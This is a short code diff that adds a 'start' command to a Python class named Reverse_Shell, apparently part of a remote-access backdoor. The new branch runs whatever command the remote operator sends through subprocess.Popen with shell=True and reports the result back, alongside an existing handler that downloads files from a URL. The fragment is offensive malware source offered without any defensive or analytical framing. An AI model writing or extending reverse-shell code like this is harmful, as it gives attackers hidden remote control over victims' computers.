@@ -77,6 +77,12 @@ class Reverse_Shell:
                     self.reliable_send("[+] Download File From the URL")
                 except:
                     self.reliable_send("[-] Failed to Download File")
+            elif command[:5] == "start":
+                try:
+                    subprocess.Popen(command[6:],shell=True)
+                    self.reliable_send("[+] Started")
+                except:
+                    self.reliable_send("[-] Failed to start")
             else:
                 try:
                     # creation of the command, see documentation
